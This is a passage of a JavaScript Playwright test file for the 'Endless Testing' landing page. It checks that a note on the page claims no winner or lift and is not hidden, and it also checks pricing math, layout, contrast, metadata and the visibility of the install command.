  const noteMatch = html.match(/<p id="dogfood-note">([\s\S]*?)<\/p>/);
  assert.ok(noteMatch, 'dogfood note missing');
  const tagged = noteMatch[0];
  const note = noteMatch[1];
  const dropHome = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace('endlesstesting-100', 'gone-home') + '</p><p>endlesstesting-100</p>',
  );
  assert.throws(() => assertDogfoodRounds(dropHome), /endlesstesting-100/);
  const dropSite = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace('valentinyeo-2', 'gone-site') + '</p><p>valentinyeo-2</p>',
  );
  assert.throws(() => assertDogfoodRounds(dropSite), /valentinyeo-2/);
  const claim = html.replace(tagged, '<p id="dogfood-note">' + note + ' The winner is the homepage.</p>');
  assert.throws(() => assertDogfoodRounds(claim), /winner/);
  const dropRunning = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace('still running', 'still listed') + '</p>',
  );
  assert.notEqual(dropRunning, html);
  assert.throws(() => assertDogfoodRounds(dropRunning), /still running/);
  const hideRunning = html.replace(
    tagged,
    `<p id="dogfood-note">${SDK_SENTENCE} ${HOME_SENTENCE} ${SITE_SENTENCE} <span hidden>${RUNNING_SENTENCE}</span> ${NO_WINNER_SENTENCE}</p>`,
  );
  assert.notEqual(hideRunning, html);
  assert.throws(() => assertDogfoodRounds(hideRunning), /still running/);
  const lift = html.replace(tagged, `<p id="dogfood-note">${note} Lift 12%.</p>`);
  assert.notEqual(lift, html);
  assert.throws(() => assertDogfoodRounds(lift), /lift/);
  const liftWord = html.replace(tagged, `<p id="dogfood-note">${note} The lift is large.</p>`);
  assert.notEqual(liftWord, html);
  assert.throws(() => assertDogfoodRounds(liftWord), /lift/);
  const liftPct = html.replace(tagged, `<p id="dogfood-note">${note} Up 12%.</p>`);
  assert.notEqual(liftPct, html);
  assert.throws(() => assertDogfoodRounds(liftPct), /lift/);
  for (const liftText of [
    'Up 12 percent.',
    'Up 12 per cent.',
    'The homepage leads by 12 percentage points.',
    'Up 12&percnt;.',
    'Up 12&amp;percnt;.',
    'Up 12\uFF05.',
    'Up 12\u066A.',
    'Uplift was strong.',
    '1.2x on the homepage.',
  ]) {
    const gave = html.replace(tagged, `<p id="dogfood-note">${note} ${liftText}</p>`);
    assert.notEqual(gave, html, liftText);
    assert.throws(() => assertDogfoodRounds(gave), /lift/, liftText);
  }
  const dropCalled = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace(' No winner has been called.', '') + '</p>',
  );
  assert.notEqual(dropCalled, html);
  assert.throws(() => assertDogfoodRounds(dropCalled), /no winner has been called/);
  const hideCalled = html.replace(
    tagged,
    `<p id="dogfood-note">${SDK_SENTENCE} ${HOME_SENTENCE} ${SITE_SENTENCE} ${RUNNING_SENTENCE} <span hidden>${NO_WINNER_SENTENCE}</span></p>`,
  );
  assert.notEqual(hideCalled, html);
  assert.throws(() => assertDogfoodRounds(hideCalled), /no winner has been called/);
  const gotWin = html.replace(tagged, `<p id="dogfood-note">${note} The homepage got the win.</p>`);
  assert.notEqual(gotWin, html);
  assert.throws(() => assertDogfoodRounds(gotWin), /winner/);
  const beat = html.replace(tagged, `<p id="dogfood-note">${note} The homepage line beat the other.</p>`);
  assert.notEqual(beat, html);
  assert.throws(() => assertDogfoodRounds(beat), /winning line/);
  const negated = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace('Both rounds are still running.', 'Not Both rounds are still running.') + '</p>',
  );
  assert.notEqual(negated, html);
  assert.throws(() => assertDogfoodRounds(negated), /not still running/);
  for (const denial of [
    'The rounds have stopped.',
    'valentinyeo-2 is finished.',
    'Neither round is still collecting visits.',
    'It is untrue that both rounds are still running.',
  ]) {
    const denied = html.replace(tagged, `<p id="dogfood-note">${note} ${denial}</p>`);
    assert.notEqual(denied, html, denial);
    assert.throws(() => assertDogfoodRounds(denied), /not still running/, denial);
  }
  const hiddenStop = html.replace(
    tagged,
    `<p id="dogfood-note">${note} <span hidden>The rounds have stopped.</span></p>`,
  );
  assert.notEqual(hiddenStop, html);
  assertDogfoodRounds(hiddenStop);
  const collecting = html.replace(
    tagged,
    `<p id="dogfood-note">${note} Both rounds are still collecting visits.</p>`,
  );
  assert.notEqual(collecting, html);
  assertDogfoodRounds(collecting);

  const rounds = `${HOME_SENTENCE} ${SITE_SENTENCE}`;
  for (const wrap of [
    (inner) => `<span hidden>${inner}</span>`,
    (inner) => `<span style="display:none">${inner}</span>`,
    (inner) => `<span style="visibility:hidden">${inner}</span>`,
    (inner) => `<span style="opacity:0">${inner}</span>`,
    (inner) => `<span style="font-size:0">${inner}</span>`,
    (inner) => `<span style="color:transparent">${inner}</span>`,
    (inner) => `<span style="position:absolute;left:-9999px">${inner}</span>`,
    (inner) => `<!-- ${inner} -->`,
    (inner) => `<script>${inner}</script>`,
  ]) {
    const concealed = html.replace(tagged, `<p id="dogfood-note">${SDK_SENTENCE} ${wrap(rounds)}</p>`);
    assert.notEqual(concealed, html);
    assert.throws(() => assertDogfoodRounds(concealed), /endlesstesting-100/);
  }

  const decoy = html.replace(tagged, `<!-- ${tagged} --><p id="dogfood-note">${SDK_SENTENCE}</p>`);
  assert.notEqual(decoy, html);
  assert.throws(() => assertDogfoodRounds(decoy), /endlesstesting-100/);

  const hiddenP = html.replace('<p id="dogfood-note">', '<p id="dogfood-note" hidden>');
  assert.notEqual(hiddenP, html);
  assert.throws(() => assertDogfoodRounds(hiddenP), /dogfood note missing/);
  const noneP = html.replace('<p id="dogfood-note">', '<p id="dogfood-note" style="display:none">');
  assert.notEqual(noneP, html);
  assert.throws(() => assertDogfoodRounds(noneP), /dogfood note missing/);

  for (const decl of ['display: none', 'visibility: hidden', 'opacity: 0', 'font-size: 0', 'color: transparent']) {
    const hiddenCss = html.replace(
      '#dogfood-note { margin-top: 0.4rem; }',
      `#dogfood-note { margin-top: 0.4rem; ${decl}; }`,
    );
    assert.notEqual(hiddenCss, html, decl);
    assert.throws(() => assertDogfoodRounds(hiddenCss), /dogfood note missing/, decl);
  }

  const unusedClass = html.replace(
    '#dogfood-note { margin-top: 0.4rem; }',
    '#dogfood-note { margin-top: 0.4rem; }\n        .gone { display: none; }',
  );
  assert.notEqual(unusedClass, html);
  assertDogfoodRounds(unusedClass);
  const classHide = unusedClass.replace('<p id="dogfood-note">', '<p id="dogfood-note" class="gone">');
  assert.notEqual(classHide, unusedClass);
  assert.throws(() => assertDogfoodRounds(classHide), /dogfood note missing/);
  const spanGone = unusedClass.replace(
    tagged,
    `<p id="dogfood-note">${SDK_SENTENCE} <span class="gone">${HOME_SENTENCE} ${SITE_SENTENCE}</span></p>`,
  );
  assert.notEqual(spanGone, unusedClass);
  assert.throws(() => assertDogfoodRounds(spanGone), /endlesstesting-100/);
  const wrapHide = html.replace(
    '.wrap { width: min(1080px, calc(100% - 2rem)); margin-inline: auto; }',
    '.wrap { width: min(1080px, calc(100% - 2rem)); margin-inline: auto; font-size: 0; }',
  );
  assert.notEqual(wrapHide, html);
  assert.throws(() => assertDogfoodRounds(wrapHide), /dogfood note missing/);
  const childMiss = html.replace(
    '#dogfood-note { margin-top: 0.4rem; }',
    '#dogfood-note { margin-top: 0.4rem; }\n        footer > p { display: none; }',
  );
  assert.notEqual(childMiss, html);
  assertDogfoodRounds(childMiss);

  for (const claimText of [
    'The &#119;inner is the homepage.',
    'The &#x77;inner is the homepage.',
    'The &amp;#119;inner is the homepage.',
    'The win\u200bner is the homepage.',
    'The winners are the homepage.',
    'The homepage is winning.',
    'The homepage wins.',
    'The homepage won.',
  ]) {
    const claimed = html.replace(tagged, `<p id="dogfood-note">${note} ${claimText}</p>`);
    assert.notEqual(claimed, html, claimText);
    assert.throws(() => assertDogfoodRounds(claimed), /winner/, claimText);
  }

  const dotted = html.replace(
    tagged,
    `<p id="dogfood-note">${SDK_SENTENCE} The homepage is round endlesstesting-100.9. ${SITE_SENTENCE}</p>`,
  );
  assert.notEqual(dotted, html);
  assert.throws(() => assertDogfoodRounds(dotted), /homepage round/);
  const siteDotted = html.replace(
    tagged,
    `<p id="dogfood-note">${SDK_SENTENCE} ${HOME_SENTENCE} valentinyeo.com is round valentinyeo-2.9.</p>`,
  );
  assert.notEqual(siteDotted, html);
  assert.throws(() => assertDogfoodRounds(siteDotted), /valentinyeo\.com round/);
  const swapped = html.replace(
    tagged,
    `<p id="dogfood-note">${SDK_SENTENCE} The homepage is round valentinyeo-2. valentinyeo.com is round endlesstesting-100.</p>`,
  );
  assert.notEqual(swapped, html);
  assert.throws(() => assertDogfoodRounds(swapped), /homepage round/);
  const droppedSdk = html.replace(tagged, `<p id="dogfood-note">${HOME_SENTENCE} ${SITE_SENTENCE}</p>`);
  assert.notEqual(droppedSdk, html);
  assert.throws(() => assertDogfoodRounds(droppedSdk), /SDK/);
});

test('agent files and share metadata are on the page', () => {
  assert.match(html, /rel="canonical" href="https:\/\/endlesstesting\.ai\/"/);
  assert.match(html, /property="og:image" content="https:\/\/endlesstesting\.ai\/og\.png"/);
  assert.match(html, /property="og:image:width" content="1200"/);
  assert.match(html, /property="og:image:height" content="630"/);
  assert.match(html, /name="twitter:card" content="summary_large_image"/);
  assert.match(html, /name="twitter:image" content="https:\/\/endlesstesting\.ai\/og\.png"/);
  const json = html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
  assert.ok(json, 'JSON-LD missing');
  const data = JSON.parse(json[1]);
  assert.equal(data['@type'], 'SoftwareApplication');
  assert.equal(data.url, 'https://endlesstesting.ai/');
  assert.equal(data.offers.price, '299');
  assert.equal(data.offers.priceCurrency, 'USD');
  const llms = fs.readFileSync(path.join(root, 'llms.txt'), 'utf8');
  const full = fs.readFileSync(path.join(root, 'llms-full.txt'), 'utf8');
  const script = 'src="https://api.endlesstesting.ai/api/sdk.js" async data-cfasync="false"';
  for (const text of [llms, full]) {
    assert.equal(text.includes('\u2014'), false);
    assert.equal(text.includes('\u2013'), false);
    assert.match(text, /et login/);
    assert.match(text, /et mcp/);
    assert.ok(text.includes('data-cfasync="false"'));
    assert.match(text, /blockUntilVariants/);
  }
  assert.match(full, /The SDK blocks rendering when `blockUntilVariants` is omitted/);
  assert.ok(full.includes(script));
  const robots = fs.readFileSync(path.join(root, 'robots.txt'), 'utf8');
  const sitemap = fs.readFileSync(path.join(root, 'sitemap.xml'), 'utf8');
  assert.match(robots, /Sitemap: https:\/\/endlesstesting\.ai\/sitemap\.xml/);
  assert.match(sitemap, /<loc>https:\/\/endlesstesting\.ai\/<\/loc>/);
  assert.equal(sitemap.includes('ads.html'), false);
  const png = fs.readFileSync(path.join(root, 'og.png'));
  assert.deepEqual([...png.subarray(0, 8)], [137, 80, 78, 71, 13, 10, 26, 10]);
  assert.equal(png.subarray(12, 16).toString('ascii'), 'IHDR');
  assert.equal(png.readUInt32BE(16), 1200);
  assert.equal(png.readUInt32BE(20), 630);
});

describe('landing layout', () => {
  let server;
  let browser;
  let page;
  let base;

  before(async () => {
    server = await listen();
    base = `http://127.0.0.1:${server.address().port}/`;
    browser = await chromium.launch({ executablePath: newestChrome() });
    page = await browser.newPage();
  });

  after(async () => {
    await browser.close();
    await new Promise((resolve) => server.close(resolve));
  });

  async function open() {
    await page.goto(base, { waitUntil: 'networkidle' });
    await page.evaluate(() => document.fonts.ready);
  }

  test('wordmark is one word, anchors clear the header, and 375 does not scroll sideways', async () => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.emulateMedia({ colorScheme: 'light' });
    await open();

    const logoBox = await page.evaluate(() => {
      const logo = document.querySelector('.logo');
      const text = [...logo.childNodes].find((node) => node.nodeType === Node.TEXT_NODE);
      const range = document.createRange();
      range.selectNodeContents(text);
      const textBox = range.getBoundingClientRect();
      const mark = logo.querySelector('span').getBoundingClientRect();
      return {
        gap: mark.left - textBox.right,
        line: Math.abs(mark.top - textBox.top),
      };
    });
    assert.ok(logoBox.gap < 2 && logoBox.gap > -0.5, `logo gap is ${logoBox.gap}px`);
    assert.ok(logoBox.line < 2, `logo wraps, line delta ${logoBox.line}px`);

    const narrow = await page.evaluate(() => ({
      overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
      links: getComputedStyle(document.querySelector('.nav-links')).display,
    }));
    assert.equal(narrow.overflow, 0);
    assert.equal(narrow.links, 'none');

    await page.click('#nav-toggle');
    await page.click('#nav-panel a[href="#how"]');
    await page.waitForFunction(() => {
      const heading = document.querySelector('#how h2').getBoundingClientRect();
      const header = document.querySelector('header').getBoundingClientRect();
      const panel = document.getElementById('nav-panel');
      return panel.hasAttribute('hidden')
        && document.getElementById('nav-toggle').getAttribute('aria-expanded') === 'false'
        && heading.top >= header.bottom - 1
        && heading.top <= header.bottom + 180
        && heading.bottom <= window.innerHeight;
    });
    await page.goBack();
    await page.waitForFunction(() => location.hash === '' && window.scrollY < 40);

    await page.setViewportSize({ width: 1280, height: 900 });
    await open();
    await page.click('.nav-links a[href="#pricing"]');
    await page.waitForFunction(() => {
      const heading = document.querySelector('#pricing h2').getBoundingClientRect();
      const header = document.querySelector('header').getBoundingClientRect();
      return heading.top >= header.bottom - 1
        && heading.top <= header.bottom + 180
        && heading.bottom <= window.innerHeight;
    });

    const desktopNav = await page.evaluate(() => {
      const how = document.querySelector('.nav-links a[href="#how"]').getBoundingClientRect();
      const cta = document.querySelector('.nav-links .btn').getBoundingClientRect();
      return {
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        links: getComputedStyle(document.querySelector('.nav-links')).display,
        howH: how.height,
        ctaH: cta.height,
      };
    });
    assert.equal(desktopNav.overflow, 0);
    assert.equal(desktopNav.links, 'flex');
    assert.ok(desktopNav.howH < 32, `How it works height ${desktopNav.howH}`);
    assert.ok(desktopNav.ctaH < 60, `trial button height ${desktopNav.ctaH}`);
  });

  test('desktop nav stays a single row once it is shown, and the menu closes on resize', async () => {
    await page.setViewportSize({ width: 800, height: 800 });
    await page.emulateMedia({ colorScheme: 'light' });
    await open();
    const mid = await page.evaluate(() => ({
      overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
      links: getComputedStyle(document.querySelector('.nav-links')).display,
      toggle: getComputedStyle(document.getElementById('nav-toggle')).display,
    }));
    assert.equal(mid.overflow, 0);
    assert.equal(mid.links, 'none');
    assert.notEqual(mid.toggle, 'none');

    await page.click('#nav-toggle');
    await page.setViewportSize({ width: 1280, height: 800 });
    await page.waitForFunction(() => document.getElementById('nav-panel').hasAttribute('hidden'));
    await page.setViewportSize({ width: 375, height: 812 });
    const closed = await page.evaluate(() => document.getElementById('nav-panel').hasAttribute('hidden'));
    assert.equal(closed, true);

    await page.setViewportSize({ width: 900, height: 800 });
    const wide = await page.evaluate(() => {
      const how = document.querySelector('.nav-links a[href="#how"]').getBoundingClientRect();
      const cta = document.querySelector('.nav-links .btn').getBoundingClientRect();
      return {
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        howH: how.height,
        ctaH: cta.height,
      };
    });
    assert.equal(wide.overflow, 0);
    assert.ok(wide.howH < 32, `How it works height ${wide.howH}`);
    assert.ok(wide.ctaH < 60, `trial button height ${wide.ctaH}`);
  });

  test('billing toggle matches the annual math', async () => {
    await page.setViewportSize({ width: 1280, height: 900 });
    await open();
    assert.equal(await page.locator('#price-amount').innerText(), '$299');
    await page.click('#billing-annual');
    assert.equal(await page.locator('#price-amount').innerText(), '$249');
    assert.match(await page.locator('#price-subcopy').innerText(), /\$2,988\/yr/);
    assert.match(await page.locator('#price-subcopy').innerText(), /Save \$600\/yr/);
    assert.equal(await page.locator('#billing-annual').getAttribute('aria-selected'), 'true');
    assert.equal(await page.locator('#price-panel').getAttribute('aria-labelledby'), 'billing-annual');
    await page.click('#billing-monthly');
    assert.equal(await page.locator('#price-amount').innerText(), '$299');
    assert.match(await page.locator('#price-subcopy').innerText(), /\$249\/mo/);
    assert.equal(await page.locator('#billing-monthly').getAttribute('aria-selected'), 'true');
    assert.equal(await page.locator('#price-panel').getAttribute('aria-labelledby'), 'billing-monthly');
  });

  test('dark terminal is a distinct panel and 375 does not scroll sideways', async () => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.emulateMedia({ colorScheme: 'dark' });
    await open();
    const dark = await page.evaluate(() => {
      const style = getComputedStyle(document.querySelector('.terminal'));
      return {
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        body: getComputedStyle(document.body).backgroundColor,
        panel: style.backgroundColor,
        borderWidth: parseFloat(style.borderTopWidth),
      };
    });
    assert.equal(dark.overflow, 0);
    assert.ok(dark.borderWidth >= 1, 'dark terminal has no edge');
    const apart = distance(rgb(dark.body), rgb(dark.panel));
    assert.ok(apart >= 20, `terminal background ${dark.panel} blends into ${dark.body} (${apart})`);

    const rawCommands = await page.locator('#terminal').innerText();
    assertLoginText(rawCommands);
    const commands = normalizePage(rawCommands);
    assert.match(commands, /\$ et login --(?:email|code)\n\$ et site add\n\$ et round start\n\$ et status\ndecision: continue/);
    assert.equal(commands.toLowerCase().replace(/\s+/g, ' ').includes('winner: clear price'), false);

    const winner = await page.evaluate(() => {
      const el = document.querySelector('.terminal .dim');
      const style = getComputedStyle(el);
      const rect = el.getBoundingClientRect();
      const term = document.querySelector('.terminal').getBoundingClientRect();
      return {
        text: el.textContent.trim(),
        opacity: Number(style.opacity),
        display: style.display,
        visibility: style.visibility,
        fontSize: parseFloat(style.fontSize),
        left: rect.left,
        right: rect.right,
        termLeft: term.left,
        termRight: term.right,
      };
    });
    assert.equal(normalizePage(winner.text).trim(), 'decision: continue');
    assert.equal(winner.display, 'inline');
    assert.equal(winner.visibility, 'visible');
    assert.ok(winner.opacity >= 0.99, `winner opacity ${winner.opacity}`);
    assert.ok(winner.fontSize >= 12, `winner font size ${winner.fontSize}`);
    assert.ok(winner.left >= winner.termLeft - 1 && winner.right <= winner.termRight + 1, 'winner line is clipped');
  });

  test('hero shows the still-running sentence', async () => {
    const sentence = 'A round that is still running prints decision: continue and does not name a winner.';
    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      for (const width of [375, 1280]) {
        await page.setViewportSize({ width, height: width === 375 ? 812 : 900 });
        await open();
        const info = await page.evaluate((want) => {
          const hero = document.querySelector('section.hero');
          const note = document.getElementById('dogfood-note');
          let el = null;
          for (const node of hero.querySelectorAll('p')) {
            const text = node.innerText.replace(/\s+/g, ' ').trim();
            if (text === want) el = node;
          }
          if (!el) return { found: false };
          const style = getComputedStyle(el);
          const rect = el.getBoundingClientRect();
          let node = el;
          let bg = style.backgroundColor;
          while (node && (bg === 'transparent' || bg === 'rgba(0, 0, 0, 0)')) {
            node = node.parentElement;
            bg = node ? getComputedStyle(node).backgroundColor : bg;
          }
          return {
            found: true,
            inNote: note.contains(el),
            inHero: hero.contains(el),
            display: style.display,
            visibility: style.visibility,
            opacity: Number(style.opacity),
            fontSize: parseFloat(style.fontSize),
            width: rect.width,
            height: rect.height,
            left: rect.left,
            right: rect.right,
            color: style.color,
            bg,
            overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
            winner: document.querySelector('#terminal .dim').textContent.trim(),
            noteHasDecision: note.innerText.includes('decision: continue'),
            heroText: hero.innerText.replace(/\s+/g, ' ').trim(),
          };
        }, sentence);
        assert.equal(info.found, true, `${scheme} ${width} sentence missing`);
        assert.equal(info.inHero, true, `${scheme} ${width} sentence outside hero`);
        assert.equal(info.inNote, false, `${scheme} ${width} sentence inside dogfood note`);
        assert.notEqual(info.display, 'none', `${scheme} ${width} display`);
        assert.equal(info.visibility, 'visible', `${scheme} ${width} visibility`);
        assert.ok(info.opacity >= 0.99, `${scheme} ${width} opacity ${info.opacity}`);
        assert.ok(info.fontSize >= 12, `${scheme} ${width} font ${info.fontSize}`);
        assert.ok(info.width > 40 && info.height > 8, `${scheme} ${width} box ${info.width}x${info.height}`);
        assert.ok(info.left >= -1, `${scheme} ${width} sentence offscreen`);
        assert.ok(info.right <= width + 1, `${scheme} ${width} sentence overflows`);
        const ratio = contrastRatio(rgb(info.color), rgb(info.bg));
        assert.ok(ratio >= 4.5, `${scheme} ${width} contrast ${ratio.toFixed(2)} ${info.color} on ${info.bg}`);
        assert.equal(info.overflow, 0, `${scheme} ${width} page overflow ${info.overflow}`);
        assert.equal(normalizePage(info.winner).trim(), 'decision: continue');
        assert.equal(
          normalizePage(info.heroText).toLowerCase().replace(/\s+/g, ' ').includes('winner: clear price'),
          false,
          `${scheme} ${width} hero names Clear price`,
        );
        assert.equal(info.noteHasDecision, false, `${scheme} ${width} dogfood note has the status sentence`);
        assert.equal(claimsLiveRoundWinner(info.heroText), false, `${scheme} ${width} hero claims a live round winner`);
      }
    }
  });

  test('install files stay visible beside the terminal', async () => {
    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      for (const width of [375, 1280]) {
        await page.setViewportSize({ width, height: width === 375 ? 812 : 900 });
        await open();
        const info = await page.evaluate(() => {
          const el = document.querySelector('.install-files');
          const term = document.getElementById('terminal');
          const style = getComputedStyle(el);
          const rect = el.getBoundingClientRect();
          let node = el;
          let bg = getComputedStyle(node).backgroundColor;
          while (node && (bg === 'transparent' || bg === 'rgba(0, 0, 0, 0)')) {
            node = node.parentElement;
            bg = node ? getComputedStyle(node).backgroundColor : bg;
          }
          const code = el.querySelector('code');
          const codeStyle = code ? getComputedStyle(code) : null;
          const codeRect = code ? code.getBoundingClientRect() : null;
          let codeBg = codeStyle ? codeStyle.backgroundColor : bg;
          let codeNode = code;
          while (codeNode && (codeBg === 'transparent' || codeBg === 'rgba(0, 0, 0, 0)')) {
            codeNode = codeNode.parentElement;
            codeBg = codeNode ? getComputedStyle(codeNode).backgroundColor : codeBg;
          }
          const pageText = document.body.innerText
            .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
            .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '')
            .replace(/\s+/g, ' ')
            .toLowerCase();
          return {
            text: el.innerText,
            pageText,
            overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
            display: style.display,
            visibility: style.visibility,
            opacity: Number(style.opacity),
            fontSize: parseFloat(style.fontSize),
            color: style.color,
            bg,
            beside: term.nextElementSibling === el,
            left: rect.left,
            right: rect.right,
            width: rect.width,
            innerWidth: window.innerWidth,
            codeText: code ? code.innerText : '',
            codeDisplay: codeStyle ? codeStyle.display : 'none',
            codeVisibility: codeStyle ? codeStyle.visibility : 'hidden',
            codeOpacity: codeStyle ? Number(codeStyle.opacity) : 0,
            codeFont: codeStyle ? parseFloat(codeStyle.fontSize) : 0,
            codeColor: codeStyle ? codeStyle.color : style.color,
            codeBg,
            codeHeight: codeRect ? codeRect.height : 0,
            codeLeft: codeRect ? codeRect.left : 0,
            codeRight: codeRect ? codeRect.right : 0,
          };
        });
        const where = `${scheme} ${width}`;
        assert.equal(info.overflow, 0, `${where} scrolls sideways`);
        assert.equal(info.beside, true, where);
        assert.equal(info.display, 'block', where);
        assert.equal(info.visibility, 'visible', where);
        assert.ok(info.opacity >= 0.99, `${where} opacity ${info.opacity}`);
        assert.ok(info.fontSize >= 12, `${where} font ${info.fontSize}`);
        assert.ok(info.width > 100, where);
        assert.ok(info.left >= -1 && info.right <= info.innerWidth + 1, `${where} install files clipped`);
        for (const name of INSTALL_FILES) assert.ok(hasInstallFile(info.text, name), `${where} ${name}`);
        assert.match(info.text, /The script picks the file for this machine\./);
        assert.ok(info.text.includes(CURL_INSTALL_LINE), `${where} install command not visible`);
        assert.equal(info.pageText.includes('gh release download'), false, `${where} shows gh release download`);
        assert.equal(info.pageText.includes('releases/download'), false, `${where} shows releases/download`);
        assert.equal(info.codeText.trim(), CURL_INSTALL_LINE, where);
        assert.notEqual(info.codeDisplay, 'none', where);
        assert.equal(info.codeVisibility, 'visible', where);
        assert.ok(info.codeOpacity >= 0.99, `${where} command opacity ${info.codeOpacity}`);
        assert.ok(info.codeFont >= 12, `${where} command font ${info.codeFont}`);
        assert.ok(info.codeHeight > 8, `${where} command height ${info.codeHeight}`);
        assert.ok(info.codeLeft >= -1 && info.codeRight <= info.innerWidth + 1, `${where} command clipped`);
        const ratio = contrastRatio(rgb(info.color), rgb(info.bg));
        assert.ok(ratio >= 4.5, `${where} install contrast ${ratio.toFixed(2)}`);
        const codeRatio = contrastRatio(rgb(info.codeColor), rgb(info.codeBg));
        assert.ok(codeRatio >= 4.5, `${where} command contrast ${codeRatio.toFixed(2)}`);
      }
    }
  });

  test('trial button text stays on the green fill', async () => {
    async function readButton(selector) {
      return page.evaluate((selector) => {
        const el = document.querySelector(selector);
        const style = getComputedStyle(el);
        return {
          color: style.color,
          bg: style.backgroundColor,
          padLeft: parseFloat(style.paddingLeft),
          padRight: parseFloat(style.paddingRight),
        };
      }, selector);
    }

    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      await page.setViewportSize({ width: 375, height: 812 });
      await open();
      await page.click('#nav-toggle');
      const mobile = await readButton('#nav-panel .btn');
      const mobileRatio = contrastRatio(rgb(mobile.color), rgb(mobile.bg));
      assert.ok(mobileRatio >= 4.5, `${scheme} mobile trial contrast ${mobileRatio.toFixed(2)}`);
      assert.ok(mobile.padLeft >= 16 && mobile.padRight >= 16, `${scheme} mobile trial padding ${mobile.padLeft} ${mobile.padRight}`);

      await page.setViewportSize({ width: 1280, height: 900 });
      await open();
      await page.hover('.nav-links .btn');
      const desk = await readButton('.nav-links .btn');
      const deskRatio = contrastRatio(rgb(desk.color), rgb(desk.bg));
      assert.ok(deskRatio >= 4.5, `${scheme} desktop trial hover contrast ${deskRatio.toFixed(2)}`);
    }
  });

  test('wordmark suffix and dogfood note meet contrast', async () => {
    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      await page.setViewportSize({ width: 375, height: 812 });
      await open();
      const sample = await page.evaluate(() => {
        function paint(el) {
          const style = getComputedStyle(el);
          const color = style.color;
          let node = el;
          let bg = getComputedStyle(node).backgroundColor;
          while (node && (bg === 'transparent' || bg === 'rgba(0, 0, 0, 0)')) {
            node = node.parentElement;
            bg = node ? getComputedStyle(node).backgroundColor : bg;
          }
          const rect = el.getBoundingClientRect();
          return {
            color,
            bg,
            text: el.innerText,
            display: style.display,
            visibility: style.visibility,
            opacity: Number(style.opacity),
            fontSize: parseFloat(style.fontSize),
            width: rect.width,
            height: rect.height,
          };
        }
        const noteEl = document.getElementById('dogfood-note');
        noteEl.scrollIntoView();
        return {
          mark: paint(document.querySelector('.logo span')),
          note: paint(noteEl),
          winner: paint(document.querySelector('.terminal .dim')),
        };
      });
      for (const [name, colors] of Object.entries(sample)) {
        const ratio = contrastRatio(rgb(colors.color), rgb(colors.bg));
        assert.ok(ratio >= 4.5, `${scheme} ${name} contrast ${ratio.toFixed(2)} ${colors.color} on ${colors.bg}`);
      }
      const note = sample.note;
      const noteText = normalizePage(note.text).replace(/\s+/g, ' ').trim();
      assert.match(noteText, /This page runs the Endless Testing SDK\./);
      assert.match(noteText, /The homepage is round endlesstesting-100\./);
      assert.match(noteText, /valentinyeo\.com is round valentinyeo-2\./);
      assert.match(noteText, /Both rounds are still running\./);
      assert.match(noteText, /No winner has been called\./);
      assert.equal(noteClaimsWinner(noteText), false, `${scheme} dogfood note claims a winner`);
      assert.equal(noteNamesWinningLine(noteText), false, `${scheme} dogfood note names a winning line`);
      assert.equal(noteDeniesRunning(noteText), false, `${scheme} dogfood note says a round is not still running`);
      assert.equal(noteGivesLift(noteText), false, `${scheme} dogfood note gives a lift`);
      assert.notEqual(note.display, 'none', `${scheme} dogfood note display`);
      assert.equal(note.visibility, 'visible', `${scheme} dogfood note visibility`);
      assert.ok(note.opacity >= 0.99, `${scheme} dogfood note opacity ${note.opacity}`);
      assert.ok(note.fontSize >= 12, `${scheme} dogfood note font ${note.fontSize}`);
      assert.ok(note.width > 0 && note.height > 0, `${scheme} dogfood note box ${note.width}x${note.height}`);
    }
  });

  test('same-origin requests do not 404', async () => {
    const misses = [];
    const onResponse = (res) => {
      const url = new URL(res.url());
      if (url.hostname === '127.0.0.1' && res.status() >= 400) misses.push(`${url.pathname} ${res.status()}`);
    };
    page.on('response', onResponse);
    try {
      await page.setViewportSize({ width: 1280, height: 900 });
      await open();
      assert.deepEqual(misses, []);
    } finally {
      page.off('response', onResponse);
    }
  });

  test('escape closes the mobile menu', async () => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.emulateMedia({ colorScheme: 'light' });
    await open();
    await page.click('#nav-toggle');
    assert.equal(await page.locator('#nav-toggle').getAttribute('aria-expanded'), 'true');
    await page.keyboard.press('Escape');
    assert.equal(await page.locator('#nav-panel').getAttribute('hidden'), '');
    assert.equal(await page.locator('#nav-toggle').getAttribute('aria-expanded'), 'false');
  });

  test('visible install links point at the install docs', async () => {
    function readInstall(selector) {
      return page.evaluate((selector) => {
        const el = document.querySelector(selector);
        if (!el) return { found: false };
        const style = getComputedStyle(el);
        const rect = el.getBoundingClientRect();
        return {
          found: true,
          text: el.innerText.replace(/\s+/g, ' ').trim(),
          href: el.getAttribute('href'),
          display: style.display,
          visibility: style.visibility,
          opacity: Number(style.opacity),
          fontSize: parseFloat(style.fontSize),
          width: rect.width,
          height: rect.height,
          left: rect.left,
          right: rect.right,
          top: rect.top,
          bottom: rect.bottom,
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
          privateRepo: document.documentElement.innerHTML.toLowerCase().includes('github.com/valentinyeo/endless-testing'),
        };
      }, selector);
    }

    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      await page.setViewportSize({ width: 1280, height: 900 });
      await open();
